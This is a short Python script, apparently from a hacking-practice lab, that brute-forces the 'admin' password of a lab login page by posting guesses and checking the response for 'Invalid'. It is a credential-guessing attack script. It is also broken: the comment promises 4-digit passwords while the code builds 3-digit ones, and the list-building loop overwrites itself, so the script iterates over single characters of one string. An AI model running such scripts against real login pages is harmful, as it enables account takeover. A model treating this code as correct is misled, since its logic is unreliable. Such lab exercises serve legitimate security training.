# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "requests",
# ]
# ///
import requests

url = "http://python.thm/labs/lab1/index.php"

username = "admin"

# generating a 4-digit numeric password (0000-9999)
numeric_value = [str(i).zfill(3) for i in range(1000)]
for char_code in range(ord('a'), ord('z') + 1):
    alphabet_char = chr(char_code)
    password_list = alphabet_char + str(numeric_value)

def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"Combined value: {password}")

brute_force()